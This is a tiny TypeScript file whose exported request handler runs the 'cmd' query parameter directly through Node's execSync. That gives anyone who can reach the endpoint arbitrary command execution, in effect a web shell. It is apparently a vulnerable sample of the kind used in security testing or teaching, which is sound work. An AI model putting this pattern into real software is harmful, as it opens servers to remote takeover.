import { execSync } from "node:child_process";
export function handler(req: { query: { cmd: string } }) {
  execSync(req.query.cmd);
}
